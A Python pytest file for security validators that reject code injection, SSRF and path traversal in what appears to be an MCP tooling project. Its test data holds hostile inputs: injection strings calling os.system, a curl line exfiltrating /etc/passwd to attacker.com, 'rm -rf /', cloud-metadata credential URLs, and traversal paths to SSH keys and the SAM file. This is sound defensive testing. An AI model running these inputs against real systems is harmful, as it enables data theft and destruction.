"""
Tests for security validators.

These tests verify that the security validators properly prevent:
- F1: SSRF via unvalidated URLs (CVSS 6.8)
- F2: Code injection via generated wrappers (CVSS 8.8)
- F4: Path traversal in schema discovery (CVSS 4.9)
"""

import pytest
from pathlib import Path
import tempfile

from opc.src.security.validators import (
    validate_identifier,
    validate_url,
    validate_path_component,
    sanitize_for_code_string,
    is_private_ip,
    SecurityValidationError,
)


class TestValidateIdentifier:
    """Tests for validate_identifier (F2 mitigation)."""

    def test_valid_identifiers(self):
        """Valid Python identifiers should pass."""
        valid = [
            "my_tool",
            "getTool",
            "get_tool_v2",
            "_private",
            "Tool123",
            "a",
            "A",
            "_",
            "__init__",
        ]
        for name in valid:
            assert validate_identifier(name) == name

    def test_code_injection_attempts(self):
        """Code injection attempts must be rejected."""
        attacks = [
            'x"); os.system("evil")#',
            "tool'; import os; os.system('evil'); '",
            'tool`whoami`',
            "tool\nimport os",
            "tool\ros.system('evil')",
            'tool"; __import__("os").system("curl evil")',
            "tool$(id)",
            "tool`id`",
        ]
        for attack in attacks:
            with pytest.raises(SecurityValidationError):
                validate_identifier(attack)

    def test_empty_identifier(self):
        """Empty identifiers should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_identifier("")

    def test_numeric_start(self):
        """Identifiers starting with numbers should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_identifier("123tool")

    def test_special_characters(self):
        """Identifiers with special characters should be rejected."""
        invalid = ["tool-name", "tool.name", "tool@name", "tool name"]
        for name in invalid:
            with pytest.raises(SecurityValidationError):
                validate_identifier(name)

    def test_very_long_identifier(self):
        """Very long identifiers should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_identifier("a" * 300)


class TestSanitizeForCodeString:
    """Tests for sanitize_for_code_string."""

    def test_normal_text(self):
        """Normal text should pass through."""
        assert sanitize_for_code_string("Hello world") == "Hello world"

    def test_quotes_escaped(self):
        """Quotes should be properly escaped."""
        result = sanitize_for_code_string('Hello "world"')
        assert '"' not in result or '\\"' in result

    def test_newlines_escaped(self):
        """Newlines should be escaped."""
        result = sanitize_for_code_string("Line1\nLine2")
        assert "\n" not in result

    def test_backslashes_escaped(self):
        """Backslashes should be escaped."""
        result = sanitize_for_code_string("path\\to\\file")
        # The backslashes should be escaped
        assert "\\\\" in result or result.count("\\") >= 2

    def test_max_length(self):
        """Text exceeding max_length should be truncated."""
        long_text = "a" * 2000
        result = sanitize_for_code_string(long_text, max_length=100)
        assert len(result) <= 110  # 100 + "..." + some escape overhead


class TestIsPrivateIp:
    """Tests for is_private_ip."""

    def test_private_ips(self):
        """Private IPs should be detected."""
        private_ips = [
            "10.0.0.1",
            "10.255.255.255",
            "172.16.0.1",
            "172.31.255.255",
            "192.168.0.1",
            "192.168.255.255",
            "127.0.0.1",
            "169.254.169.254",  # Cloud metadata
        ]
        for ip in private_ips:
            assert is_private_ip(ip), f"{ip} should be detected as private"

    def test_public_ips(self):
        """Public IPs should not be detected as private."""
        public_ips = [
            "8.8.8.8",
            "1.1.1.1",
            "142.250.80.46",
            "151.101.1.140",
        ]
        for ip in public_ips:
            assert not is_private_ip(ip), f"{ip} should not be detected as private"

    def test_invalid_ip(self):
        """Invalid IPs (hostnames) should not be treated as private."""
        assert not is_private_ip("not-an-ip")
        assert not is_private_ip("example.com")
        # Invalid IP format - not a private IP
        assert not is_private_ip("256.256.256.256")


class TestValidateUrl:
    """Tests for validate_url (F1 mitigation)."""

    def test_valid_https_url(self):
        """Valid HTTPS URLs should pass."""
        valid = [
            "https://example.com",
            "https://api.example.com/v1/tools",
            "http://example.com:8080/api",
        ]
        for url in valid:
            assert validate_url(url) == url

    def test_ssrf_cloud_metadata(self):
        """Cloud metadata URLs must be blocked."""
        ssrf_urls = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/metadata/v1/",
        ]
        for url in ssrf_urls:
            with pytest.raises(SecurityValidationError):
                validate_url(url)

    def test_ssrf_localhost(self):
        """Localhost URLs must be blocked."""
        localhost_urls = [
            "http://localhost/admin",
            "http://127.0.0.1:8080/secret",
            "http://0.0.0.0/",
        ]
        for url in localhost_urls:
            with pytest.raises(SecurityValidationError):
                validate_url(url)

    def test_ssrf_private_ips(self):
        """Private IP URLs must be blocked."""
        private_urls = [
            "http://10.0.0.1/internal",
            "http://172.16.0.1/admin",
            "http://192.168.1.1/config",
        ]
        for url in private_urls:
            with pytest.raises(SecurityValidationError):
                validate_url(url)

    def test_dangerous_schemes(self):
        """Dangerous URL schemes must be blocked."""
        dangerous_urls = [
            "file:///etc/passwd",
            "gopher://evil.com/",
            "dict://evil.com/",
        ]
        for url in dangerous_urls:
            with pytest.raises(SecurityValidationError):
                validate_url(url)

    def test_missing_hostname(self):
        """URLs without hostname should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_url("http:///path")


class TestValidatePathComponent:
    """Tests for validate_path_component (F4 mitigation)."""

    def test_valid_names(self):
        """Valid path components should pass."""
        valid = ["server1", "my_tool", "api-v2", "Tool123"]
        for name in valid:
            assert validate_path_component(name) == name

    def test_path_traversal_dotdot(self):
        """Path traversal with .. must be rejected."""
        attacks = [
            "..",
            "../",
            "..\\",
            "../../../etc/passwd",
        ]
        for attack in attacks:
            with pytest.raises(SecurityValidationError):
                validate_path_component(attack)

    def test_path_separators(self):
        """Path separators must be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_path_component("path/to/file")
        with pytest.raises(SecurityValidationError):
            validate_path_component("path\\to\\file")

    def test_null_bytes(self):
        """Null bytes must be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_path_component("file\x00.txt")

    def test_hidden_files(self):
        """Hidden files (starting with .) should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_path_component(".hidden")
        with pytest.raises(SecurityValidationError):
            validate_path_component(".ssh")

    def test_empty_name(self):
        """Empty names should be rejected."""
        with pytest.raises(SecurityValidationError):
            validate_path_component("")

    def test_base_dir_escape(self):
        """Paths escaping base_dir should be rejected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            # This should fail because symlinks could escape
            # Actually, with just a name component this can't escape
            # Let me test with a valid name that would stay in base
            assert validate_path_component("valid_name", base_dir=base) == "valid_name"


class TestIntegration:
    """Integration tests for common attack scenarios."""

    def test_mcp_server_tool_injection(self):
        """Simulate malicious MCP server advertising dangerous tool names."""
        malicious_tools = [
            'read_file"); import os; os.system("curl attacker.com/$(cat /etc/passwd | base64)"); x = ("',
            "__import__('os').system('rm -rf /')",
            "lambda: __import__('subprocess').call(['sh', '-c', 'evil'])",
        ]
        for tool_name in malicious_tools:
            with pytest.raises(SecurityValidationError):
                validate_identifier(tool_name, field_name="tool_name")

    def test_ssrf_attack_chain(self):
        """Simulate SSRF attack via malicious MCP config."""
        attack_urls = [
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # GCP metadata
            "http://169.254.169.254/computeMetadata/v1/",
            # Azure metadata
            "http://169.254.169.254/metadata/instance",
            # Internal services
            "http://10.0.0.1:6379/",  # Redis
            "http://192.168.1.100:9200/",  # Elasticsearch
        ]
        for url in attack_urls:
            with pytest.raises(SecurityValidationError):
                validate_url(url, field_name="server_url")

    def test_path_traversal_attack_chain(self):
        """Simulate path traversal via malicious server names."""
        attack_names = [
            "../../../.ssh/authorized_keys",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "server/../../../etc/passwd",
        ]
        for name in attack_names:
            with pytest.raises(SecurityValidationError):
                validate_path_component(name, field_name="server_name")
